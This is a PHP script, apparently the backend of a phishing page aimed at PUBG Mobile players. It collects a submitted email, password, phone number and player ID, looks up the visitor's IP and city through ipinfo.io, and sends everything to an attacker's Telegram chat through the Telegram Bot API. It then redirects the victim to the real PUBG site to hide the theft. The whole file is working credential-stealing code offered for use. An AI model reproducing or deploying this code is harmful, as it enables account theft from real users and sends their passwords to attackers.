<?php
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$time = date("Y-m-d H:i:s");
$phone = $_POST['phone'];
$playid = $_POST['playid'];
$apiToken = $tokenYhya;
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $yhya = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$yhya";
        $yhyasyrian = file_get_contents($url);
        return json_decode($yhyasyrian);
    }
    function getUserIP()
    {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

$ip = getUserIP();
$api = json_decode(file_get_contents("https://ipinfo.io/$ip"));
$country = $api->country;
$city = $api->city;
$year = date('Y');
$month = date('n');
$day = date('j');
$admin = $idYhya;
bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
ʜɪ ɴᴇᴡ ᴀᴄᴄᴏᴜɴᴛ
━━━━━━━━━━━━━━━
ᯓ ᴛʏᴘᴇ » $login
ᯓ ᴇᴍᴀɪʟ » `$email`
ᯓ ᴘᴀssᴡᴏʀᴅ » `$password`
ᯓ ɪᴅ » `$playid`
ᯓ ᴅᴀᴛᴇ » $day/$month/$year
ᯓ ᴄᴛʏ  » $city
ᯓ ᴄᴏᴜɴᴛʀʏ » $country
━━━━━━━━━━━━
 - ʙʏ »  @FF55Q
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
header('Location: https://www.pubgmobile.com/en-US/home.shtml');